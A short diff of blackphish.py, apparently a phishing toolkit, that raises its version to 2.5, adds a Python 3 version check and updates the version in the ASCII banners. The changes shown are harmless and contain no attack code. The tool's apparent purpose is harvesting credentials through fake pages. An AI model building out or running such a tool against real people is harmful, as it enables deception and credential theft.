@@ -10,7 +10,7 @@
 
 
 
-# version 2.4: - Small adjustments - Allow custom domain names
+# version 2.5: - Check for python version
 
 # Please update version number each time we update
 
@@ -22,6 +22,7 @@ try:
     from time import sleep
     from socket import create_connection, gethostname, gethostbyname
     from distutils import dir_util
+    from sys import version_info
 except ImportError:
     print("\033[31;1m" + "[!] Import Error, Aborting!")
     print("[!] Please run: \"chmod +x install.sh && ./install.sh\"\033[0m") # Command to run install.sh # 
@@ -50,7 +51,12 @@ white = "\033[97;1m"
 blink = "\033[5m"
 
 
-
+# Check for python version #
+if version_info < (3,0,0):
+    exit(red + "[!] Please use python3: sudo python3 blackphish.py" + reset)
+    
+    
+    
 # Check for root #
 if geteuid() != 0:
     exit(red + "[!] Please run as root" + reset)
@@ -70,7 +76,7 @@ def warning(): # Banner #
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.4
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.5
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
@@ -162,7 +168,7 @@ def banner():
           ███▀▀▀██▄                        ████████▀ 
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
-        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.4
+        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v2.5
         
                 
                     Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
